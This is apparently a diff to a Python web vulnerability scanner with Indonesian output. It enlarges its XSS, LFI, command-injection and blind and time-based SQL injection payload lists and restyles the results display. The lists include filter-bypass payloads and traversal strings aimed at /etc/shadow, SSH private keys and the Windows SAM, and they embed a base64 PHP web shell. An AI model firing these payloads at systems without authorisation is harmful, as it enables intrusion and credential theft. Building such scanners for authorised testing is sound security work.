@@ -26,16 +26,41 @@ init(autoreset=True)
 thread_lock = threading.Lock()
 
 XSS_PAYLOADS = [
+    # Basic payloads
     '<script>alert("XSS")</script>',
     '<img src=x onerror=alert("XSS")>',
     '<svg onload=alert("XSS")>',
+    '<svg/onload=alert("XSS")>',
+    # Quote bypass
     '"><script>alert("XSS")</script>',
     "'><script>alert('XSS')</script>",
-    '<body onload=alert("XSS")>',
-    '<iframe src="javascript:alert(\'XSS\')">',
     '"><img src=x onerror=alert("XSS")>',
-    "javascript:alert('XSS')",
-    '<div onmouseover="alert(\'XSS\')">',
+    "'><img src=x onerror=alert('XSS')>",
+    # Event handlers
+    '<body onload=alert("XSS")>',
+    '<input autofocus onfocus=alert("XSS")>',
+    '<details open ontoggle=alert("XSS")>',
+    '<marquee onstart=alert("XSS")>',
+    '<video src=x onerror=alert("XSS")>',
+    '<audio src=x onerror=alert("XSS")>',
+    # SVG advanced
+    '<svg><animate onbegin=alert("XSS")>',
+    '<svg><set onbegin=alert("XSS")>',
+    # Case variation bypass
+    '<ScRiPt>alert("XSS")</ScRiPt>',
+    '<IMG SRC=x OnErRoR=alert("XSS")>',
+    # HTML entity encoding
+    '<a href="&#106;avascript:alert(\'XSS\')">Click</a>',
+    # Data URI
+    '<iframe src="data:text/html,<script>alert(1)</script>">',
+    '<object data="javascript:alert(\'XSS\')">',
+    # No space bypass
+    '<img/src=x/onerror=alert("XSS")>',
+    '<svg/onload=alert`XSS`>',
+    # Template literals
+    '<script>alert`XSS`</script>',
+    # Nested tags bypass
+    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
 ]
 
 DOM_XSS_SOURCES = [
@@ -552,32 +577,79 @@ all_lfi_vulnerabilities = []
 all_rce_vulnerabilities = []
 
 LFI_PAYLOADS = [
+    # Basic Linux traversal
     '../etc/passwd',
-    '....//....//....//....//....//etc/passwd',
+    '../../etc/passwd',
+    '../../../etc/passwd',
+    '../../../../etc/passwd',
+    '../../../../../etc/passwd',
+    '../../../../../../etc/passwd',
+    '../../../../../../../etc/passwd',
+    # Double encoding bypass
     '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd',
-    '....//....//....//....//....//windows/win.ini',
+    '..%252f..%252f..%252f..%252fetc%252fpasswd',
+    # Mixed encoding bypass
+    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
+    '..%e0%80%af..%e0%80%afetc/passwd',
+    # Double dots bypass (recursive filter)
+    '....//....//....//....//....//etc/passwd',
+    '....\/....\/....\/....\/etc/passwd',
+    '..././..././..././..././etc/passwd',
+    '....\\/....\\/....\\/etc/passwd',
+    # Direct paths Linux
     '/etc/passwd',
     '/etc/shadow',
     '/etc/hosts',
+    '/etc/group',
     '/proc/self/environ',
     '/proc/version',
     '/proc/cmdline',
-    'C:\\Windows\\win.ini',
-    'C:\\Windows\\System32\\drivers\\etc\\hosts',
-    '..\\..\\..\\..\\..\\windows\\win.ini',
-    '....\\....\\....\\....\\....\\windows\\win.ini',
+    '/proc/self/fd/0',
+    '/var/log/auth.log',
+    '/var/log/syslog',
+    # Apache/Nginx logs
     '/var/log/apache2/access.log',
+    '/var/log/apache2/error.log',
     '/var/log/apache/access.log',
     '/var/log/httpd/access_log',
     '/var/log/nginx/access.log',
+    '/var/log/nginx/error.log',
+    # SSH keys
+    '/root/.ssh/id_rsa',
+    '/home/www-data/.ssh/id_rsa',
+    # Windows paths
+    'C:\\Windows\\win.ini',
+    'C:\\boot.ini',
+    'C:\\Windows\\System32\\drivers\\etc\\hosts',
+    'C:\\Windows\\repair\\sam',
+    'C:\\Windows\\repair\\system',
+    'C:\\xampp\\apache\\logs\\access.log',
+    'C:\\inetpub\\wwwroot\\web.config',
+    # Windows traversal
+    '..\\..\\..\\..\\..\\windows\\win.ini',
+    '....\\....\\....\\....\\windows\\win.ini',
+    '..\\..\\..\\..\\boot.ini',
+    # PHP wrappers
     'php://filter/convert.base64-encode/resource=index.php',
     'php://filter/convert.base64-encode/resource=../config.php',
+    'php://filter/convert.base64-encode/resource=../../config.php',
+    'php://filter/read=string.rot13/resource=index.php',
     'php://input',
+    'php://stdin',
+    # Data wrapper
     'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
+    'data://text/plain,<?php phpinfo(); ?>',
+    # Expect wrapper
     'expect://id',
+    'expect://whoami',
+    # File protocol
     'file:///etc/passwd',
+    'file:///c:/windows/win.ini',
+    # Null byte injection (PHP < 5.3)
     '/etc/passwd%00',
-    '....//....//....//....//....//etc/passwd%00',
+    '/etc/passwd%00.jpg',
+    '....//....//....//....//etc/passwd%00',
+    '../../../etc/passwd%00.html',
 ]
 
 LFI_DETECTION_PATTERNS = {
@@ -634,41 +706,88 @@ LFI_DETECTION_PATTERNS = {
 }
 
 RCE_PAYLOADS = [
+    # Basic command separators - Linux
     (';id', 'uid='),
     ('|id', 'uid='),
+    ('||id', 'uid='),
+    ('&&id', 'uid='),
+    ('& id', 'uid='),
+    # Command substitution
     ('`id`', 'uid='),
     ('$(id)', 'uid='),
+    ('$(`id`)', 'uid='),
+    # Newline/carriage return bypass
+    ('%0aid', 'uid='),
+    ('%0a id', 'uid='),
+    ('%0d%0aid', 'uid='),
+    ('\nid', 'uid='),
+    ('\n/bin/id', 'uid='),
+    # Cat passwd
     (';cat /etc/passwd', 'root:'),
     ('|cat /etc/passwd', 'root:'),
     ('`cat /etc/passwd`', 'root:'),
     ('$(cat /etc/passwd)', 'root:'),
+    ('&&cat /etc/passwd', 'root:'),
+    # Uname
     (';uname -a', 'Linux'),
     ('|uname -a', 'Linux'),
+    ('$(uname -a)', 'Linux'),
+    ('`uname -a`', 'Linux'),
+    (';uname', 'Linux'),
+    # Whoami
     (';whoami', None),
     ('|whoami', None),
     ('`whoami`', None),
     ('$(whoami)', None),
-    ('&& id', 'uid='),
-    ('|| id', 'uid='),
+    ('&&whoami', None),
+    # List directory
     (';ls -la', 'total'),
     ('|ls -la', 'total'),
+    ('`ls -la`', 'total'),
+    ('$(ls -la)', 'total'),
+    (';ls', None),
+    # PWD
     (';pwd', '/'),
     ('|pwd', '/'),
-    ('& ping -c 1 127.0.0.1', 'bytes from'),
-    ('| ping -c 1 127.0.0.1', 'bytes from'),
+    ('$(pwd)', '/'),
+    # Echo test (reliable detection)
     (';echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
     ('|echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
     ('`echo XNOXS_RCE_TEST`', 'XNOXS_RCE_TEST'),
     ('$(echo XNOXS_RCE_TEST)', 'XNOXS_RCE_TEST'),
+    ('&&echo XNOXS_RCE_TEST', 'XNOXS_RCE_TEST'),
+    # Quote escape
+    ("';id;'", 'uid='),
+    ('";id;"', 'uid='),
+    ("';id;echo '", 'uid='),
+    ('";id;echo "', 'uid='),
     ("'; echo XNOXS_RCE_TEST; '", 'XNOXS_RCE_TEST'),
     ('"; echo XNOXS_RCE_TEST; "', 'XNOXS_RCE_TEST'),
-    ('%0Aid', 'uid='),
-    ('%0a id', 'uid='),
+    # Space bypass (IFS)
+    (';cat${IFS}/etc/passwd', 'root:'),
+    (';cat$IFS/etc/passwd', 'root:'),
+    (';{cat,/etc/passwd}', 'root:'),
+    # Ping test
+    ('& ping -c 1 127.0.0.1', 'bytes from'),
+    ('| ping -c 1 127.0.0.1', 'bytes from'),
+    ('; ping -c 1 127.0.0.1', 'bytes from'),
+    # Windows commands
+    ('& whoami', None),
+    ('| whoami', None),
     ('dir', '<DIR>'),
     ('&dir', '<DIR>'),
     ('|dir', '<DIR>'),
+    ('& dir', '<DIR>'),
+    ('| dir', '<DIR>'),
     ('& type C:\\Windows\\win.ini', '[extensions]'),
     ('| type C:\\Windows\\win.ini', '[extensions]'),
+    ('& ipconfig', 'Windows'),
+    ('| ipconfig', 'Windows'),
+    ('& hostname', None),
+    ('| hostname', None),
+    # Curl/wget detection
+    (';curl --version', 'curl'),
+    ('|wget --version', 'wget'),
 ]
 
 RCE_DETECTION_PATTERNS = [
@@ -747,20 +866,49 @@ SAMPLE_DORKS = {
 }
 
 BLIND_SQLI_PAYLOADS = [
+    # Boolean-based - Single quote
     ("' AND '1'='1", "' AND '1'='2"),
     ("' OR '1'='1", "' OR '1'='2"),
+    ("' AND 1=1--", "' AND 1=2--"),
+    ("' AND 1=1#", "' AND 1=2#"),
+    ("' AND 1=1/*", "' AND 1=2/*"),
+    # Boolean-based - Double quote
     ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
+    ("\" AND 1=1--", "\" AND 1=2--"),
+    # Boolean-based - Numeric
     ("1 AND 1=1", "1 AND 1=2"),
-    ("1' AND 1=1--", "1' AND 1=2--"),
-    ("1\" AND 1=1--", "1\" AND 1=2--"),
+    ("1 AND 2>1", "1 AND 1>2"),
+    # Boolean-based - With closing parenthesis
+    ("') AND ('1'='1", "') AND ('1'='2"),
+    ("')) AND (('1'='1", "')) AND (('1'='2"),
+    # Boolean-based - Advanced
+    ("' AND ASCII(SUBSTRING((SELECT database()),1,1))>0--", "' AND ASCII(SUBSTRING((SELECT database()),1,1))>255--"),
+    ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "' AND (SELECT COUNT(*) FROM information_schema.tables)<0--"),
+    # OR-based bypass
+    ("' OR 'x'='x", "' OR 'x'='y"),
+    ("' OR 1-- -", "' OR 0-- -"),
+    ("-1' OR 1=1--", "-1' OR 1=2--"),
 ]
 
 TIME_BASED_PAYLOADS = [
+    # MySQL time-based
     ("' OR SLEEP(5)--", 5),
+    ("' AND SLEEP(5)--", 5),
+    ("' AND IF(1=1,SLEEP(5),0)--", 5),
+    ("' AND (SELECT SLEEP(5))--", 5),
+    ("1' AND SLEEP(5)#", 5),
+    ("' OR BENCHMARK(10000000,SHA1('test'))--", 5),
+    # MSSQL time-based
     ("'; WAITFOR DELAY '0:0:5'--", 5),
+    ("' WAITFOR DELAY '0:0:5'--", 5),
+    ("'; IF (1=1) WAITFOR DELAY '0:0:5'--", 5),
+    # PostgreSQL time-based
     ("' OR pg_sleep(5)--", 5),
-    ("1' AND SLEEP(5)--", 5),
-    ("1; SELECT SLEEP(5)--", 5),
+    ("'; SELECT pg_sleep(5)--", 5),
+    ("' AND (SELECT pg_sleep(5))--", 5),
+    ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
+    # Oracle time-based
+    ("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", 5),
 ]
 
 
@@ -2002,9 +2150,9 @@ def menu_view_results():
     print_banner()
     
     print(f"""
-    {Fore.CYAN}┌────────────────────────────────────────────────────────────────────┐
-    │  {Fore.YELLOW}◆  HASIL VULNERABILITY{Fore.CYAN}                                           │
-    └────────────────────────────────────────────────────────────────────┘
+    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.YELLOW}◆  HASIL VULNERABILITY SCAN{Fore.CYAN}                                        ║
+    ╚════════════════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}""")
     
     total_vulns = (len(all_vulnerabilities) + len(all_blind_sqli_vulnerabilities) + 
@@ -2015,71 +2163,124 @@ def menu_view_results():
         print_warning("Belum ada vulnerability yang ditemukan.")
         print_info("Lakukan scan terlebih dahulu untuk melihat hasil.")
     else:
-        print_success(f"Total: {Fore.RED}{len(all_vulnerabilities)}{Style.RESET_ALL} SQLi, {Fore.RED}{len(all_blind_sqli_vulnerabilities)}{Style.RESET_ALL} Blind, {Fore.MAGENTA}{len(all_xss_vulnerabilities)}{Style.RESET_ALL} XSS, {Fore.YELLOW}{len(all_dom_xss_vulnerabilities)}{Style.RESET_ALL} DOM, {Fore.GREEN}{len(all_lfi_vulnerabilities)}{Style.RESET_ALL} LFI, {Fore.RED}{len(all_rce_vulnerabilities)}{Style.RESET_ALL} RCE\n")
+        print(f"""
+    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}RINGKASAN VULNERABILITY{Fore.CYAN}                                            ║
+    ╠════════════════════════════════════════════════════════════════════╣
+    ║  {Fore.RED}■ SQL Injection     : {len(all_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Akses database langsung{Fore.CYAN}       ║
+    ║  {Fore.RED}■ Blind SQLi        : {len(all_blind_sqli_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Ekstraksi data tersembunyi{Fore.CYAN}    ║
+    ║  {Fore.MAGENTA}■ Reflected XSS     : {len(all_xss_vulnerabilities):<5}{Fore.WHITE} [HIGH] Eksekusi script di browser{Fore.CYAN}        ║
+    ║  {Fore.YELLOW}■ DOM-based XSS     : {len(all_dom_xss_vulnerabilities):<5}{Fore.WHITE} [HIGH] Manipulasi DOM client-side{Fore.CYAN}       ║
+    ║  {Fore.GREEN}■ LFI               : {len(all_lfi_vulnerabilities):<5}{Fore.WHITE} [CRITICAL] Baca file server{Fore.CYAN}              ║
+    ║  {Fore.RED}{Back.WHITE}■ RCE               : {len(all_rce_vulnerabilities):<5}{Style.RESET_ALL}{Fore.WHITE} [CRITICAL] Eksekusi perintah sistem{Fore.CYAN}    ║
+    ╠════════════════════════════════════════════════════════════════════╣
+    ║  {Fore.WHITE}TOTAL VULNERABILITY : {Fore.RED}{total_vulns:<47}{Fore.CYAN}║
+    ╚════════════════════════════════════════════════════════════════════╝
+{Style.RESET_ALL}""")
         
         if all_vulnerabilities:
-            print(f"\n    {Fore.RED}═══ SQL INJECTION VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.RED}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}SQL INJECTION VULNERABILITIES{Fore.RED}                  {Fore.WHITE}Severity: CRITICAL{Fore.RED} ║
+    ║  {Fore.YELLOW}Risiko: Attacker dapat membaca, mengubah, atau menghapus database{Fore.RED}  ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_vulnerabilities, 1):
+                error_clean = vuln['error'].replace('\n', ' ').replace('\r', '')[:100]
                 print(f"""
-    {Fore.RED}[SQLi-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*54}{Style.RESET_ALL}
-    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
-    {Fore.YELLOW}Database:{Style.RESET_ALL} {vuln['db_type']}
-    {Fore.YELLOW}Error:{Style.RESET_ALL} {vuln['error'][:80]}...""")
+    {Fore.RED}┌─ SQLi-{i} ──────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Database  :{Style.RESET_ALL} {Fore.CYAN}{vuln['db_type']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Error Msg :{Style.RESET_ALL} {Fore.RED}{error_clean}...{Style.RESET_ALL}
+    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
         if all_blind_sqli_vulnerabilities:
-            print(f"\n    {Fore.RED}═══ BLIND SQL INJECTION VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.RED}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}BLIND SQL INJECTION VULNERABILITIES{Fore.RED}            {Fore.WHITE}Severity: CRITICAL{Fore.RED} ║
+    ║  {Fore.YELLOW}Risiko: Data extraction melalui respons waktu/boolean{Fore.RED}              ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_blind_sqli_vulnerabilities, 1):
                 print(f"""
-    {Fore.RED}[Blind-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*52}{Style.RESET_ALL}
-    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
-    {Fore.YELLOW}Type:{Style.RESET_ALL} {vuln['type']}""")
+    {Fore.RED}┌─ Blind-{i} ─────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Type      :{Style.RESET_ALL} {Fore.CYAN}{vuln['type']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Technique :{Style.RESET_ALL} {Fore.MAGENTA}{'Time-based' if 'Time' in vuln['type'] else 'Boolean-based'} inference{Style.RESET_ALL}
+    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
         if all_xss_vulnerabilities:
-            print(f"\n    {Fore.MAGENTA}═══ REFLECTED XSS VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.MAGENTA}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}REFLECTED XSS VULNERABILITIES{Fore.MAGENTA}                     {Fore.WHITE}Severity: HIGH{Fore.MAGENTA} ║
+    ║  {Fore.YELLOW}Risiko: Session hijacking, cookie theft, phishing{Fore.MAGENTA}                 ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_xss_vulnerabilities, 1):
-                payload_display = vuln['payload'][:60] if len(vuln['payload']) > 60 else vuln['payload']
+                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
                 print(f"""
-    {Fore.MAGENTA}[XSS-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*55}{Style.RESET_ALL}
-    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
-    {Fore.YELLOW}Type:{Style.RESET_ALL} {vuln['xss_type']}
-    {Fore.YELLOW}Payload:{Style.RESET_ALL} {payload_display}""")
+    {Fore.MAGENTA}┌─ XSS-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
+    {Fore.WHITE}│ XSS Type  :{Style.RESET_ALL} {Fore.CYAN}{vuln['xss_type']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
+    {Fore.MAGENTA}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
         if all_dom_xss_vulnerabilities:
-            print(f"\n    {Fore.YELLOW}═══ DOM-BASED XSS VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.YELLOW}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}DOM-BASED XSS VULNERABILITIES{Fore.YELLOW}                     {Fore.WHITE}Severity: HIGH{Fore.YELLOW} ║
+    ║  {Fore.WHITE}Risiko: Client-side code execution melalui manipulasi DOM{Fore.YELLOW}         ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_dom_xss_vulnerabilities, 1):
+                source_clean = vuln['source'].replace('\\', '')
+                sink_clean = vuln['sink'].replace('\\', '').replace('s*', '').replace('(', '')
                 print(f"""
-    {Fore.YELLOW}[DOM-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*55}{Style.RESET_ALL}
-    {Fore.WHITE}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.WHITE}Source:{Style.RESET_ALL} {vuln['source']}
-    {Fore.WHITE}Sink:{Style.RESET_ALL} {vuln['sink']}""")
+    {Fore.YELLOW}┌─ DOM-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Source    :{Style.RESET_ALL} {Fore.CYAN}{source_clean}{Style.RESET_ALL} {Fore.WHITE}(data masuk dari sini){Style.RESET_ALL}
+    {Fore.WHITE}│ Sink      :{Style.RESET_ALL} {Fore.RED}{sink_clean}{Style.RESET_ALL} {Fore.WHITE}(dieksekusi di sini){Style.RESET_ALL}
+    {Fore.WHITE}│ Flow      :{Style.RESET_ALL} {Fore.YELLOW}{source_clean} → {sink_clean}{Style.RESET_ALL}
+    {Fore.YELLOW}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
         if all_lfi_vulnerabilities:
-            print(f"\n    {Fore.GREEN}═══ LFI (LOCAL FILE INCLUSION) VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.GREEN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.WHITE}LFI (LOCAL FILE INCLUSION) VULNERABILITIES{Fore.GREEN}       {Fore.WHITE}Severity: CRITICAL{Fore.GREEN} ║
+    ║  {Fore.YELLOW}Risiko: Baca file sensitif server (passwd, config, source code){Fore.GREEN}   ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_lfi_vulnerabilities, 1):
-                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
+                payload_display = vuln['payload'][:45] if len(vuln['payload']) > 45 else vuln['payload']
                 print(f"""
-    {Fore.GREEN}[LFI-{i}]{Style.RESET_ALL} {Fore.CYAN}{'─'*55}{Style.RESET_ALL}
-    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
-    {Fore.YELLOW}File Type:{Style.RESET_ALL} {vuln['file_type']}
-    {Fore.YELLOW}Payload:{Style.RESET_ALL} {payload_display}""")
+    {Fore.GREEN}┌─ LFI-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
+    {Fore.WHITE}│ File Type :{Style.RESET_ALL} {Fore.CYAN}{vuln['file_type']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
+    {Fore.WHITE}│ Impact    :{Style.RESET_ALL} {Fore.MAGENTA}Dapat membaca file sensitif di server{Style.RESET_ALL}
+    {Fore.GREEN}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
         if all_rce_vulnerabilities:
-            print(f"\n    {Fore.RED}{Back.WHITE}═══ RCE (REMOTE CODE EXECUTION) VULNERABILITIES ═══{Style.RESET_ALL}")
+            print(f"""
+    {Fore.RED}{Back.WHITE}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.BLACK}RCE (REMOTE CODE EXECUTION) VULNERABILITIES    Severity: CRITICAL{Fore.RED}{Back.WHITE} ║
+    ║  {Fore.BLACK}Risiko: FULL SYSTEM COMPROMISE - Eksekusi perintah di server!{Fore.RED}{Back.WHITE}      ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
             for i, vuln in enumerate(all_rce_vulnerabilities, 1):
-                payload_display = vuln['payload'][:50] if len(vuln['payload']) > 50 else vuln['payload']
-                evidence_display = vuln.get('evidence', 'N/A')[:50]
+                payload_display = vuln['payload'][:40] if len(vuln['payload']) > 40 else vuln['payload']
+                evidence_display = vuln.get('evidence', 'Command executed')[:40]
                 print(f"""
-    {Fore.RED}{Back.WHITE}[RCE-{i}]{Style.RESET_ALL} {Fore.RED}{'─'*55}{Style.RESET_ALL}
-    {Fore.YELLOW}URL:{Style.RESET_ALL} {vuln['url'][:70]}{'...' if len(vuln['url']) > 70 else ''}
-    {Fore.YELLOW}Parameter:{Style.RESET_ALL} {vuln['parameter']}
-    {Fore.YELLOW}Payload:{Style.RESET_ALL} {payload_display}
-    {Fore.YELLOW}Evidence:{Style.RESET_ALL} {evidence_display}""")
+    {Fore.RED}┌─ RCE-{i} ───────────────────────────────────────────────────────────┐{Style.RESET_ALL}
+    {Fore.WHITE}│ URL       :{Style.RESET_ALL} {vuln['url'][:60]}{'...' if len(vuln['url']) > 60 else ''}
+    {Fore.WHITE}│ Parameter :{Style.RESET_ALL} {Fore.YELLOW}{vuln['parameter']}{Style.RESET_ALL}
+    {Fore.WHITE}│ Payload   :{Style.RESET_ALL} {Fore.RED}{payload_display}{Style.RESET_ALL}
+    {Fore.WHITE}│ Evidence  :{Style.RESET_ALL} {Fore.GREEN}{evidence_display}{Style.RESET_ALL}
+    {Fore.WHITE}│ Impact    :{Style.RESET_ALL} {Fore.RED}{Back.WHITE} FULL SERVER COMPROMISE {Style.RESET_ALL}
+    {Fore.RED}└────────────────────────────────────────────────────────────────────┘{Style.RESET_ALL}""")
         
-        print(f"\n    {Fore.CYAN}{'─'*60}{Style.RESET_ALL}")
+        print(f"""
+    {Fore.CYAN}╔════════════════════════════════════════════════════════════════════╗
+    ║  {Fore.YELLOW}TIP:{Fore.WHITE} Gunakan menu Export untuk menyimpan hasil ke JSON/CSV{Fore.CYAN}        ║
+    ╚════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}""")
     
     input(f"\n    {Fore.CYAN}Tekan Enter untuk kembali ke menu...{Style.RESET_ALL}")
 
